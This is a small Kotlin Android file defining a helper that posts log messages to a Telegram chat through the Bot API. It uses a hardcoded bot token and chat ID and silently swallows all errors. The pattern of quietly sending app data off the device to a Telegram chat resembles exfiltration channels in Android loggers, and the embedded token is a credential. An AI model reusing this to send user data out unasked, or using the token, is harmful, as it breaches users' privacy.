package com.logger.android

import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody

object TelegramSender {
    private const val BOT_TOKEN = "7901946967:AAF0kuFAAqzogRaUEaw70OjpcsAMd9rauvQ"
    private const val CHAT_ID = "5655734389" // ЗАМЕНИТЕ НА ВАШ CHAT_ID
    
    suspend fun sendLog(message: String) {
        withContext(Dispatchers.IO) {
            try {
                val client = OkHttpClient()
                val url = "https://api.telegram.org/bot$BOT_TOKEN/sendMessage"
                val text = message.take(4000) // Telegram limit
                val body = "chat_id=$CHAT_ID&text=$text".toRequestBody()
                
                val request = Request.Builder()
                    .url(url)
                    .post(body)
                    .build()
                
                client.newCall(request).execute().close()
            } catch (e: Exception) {
                // Ignore errors for now
            }
        }
    }
}
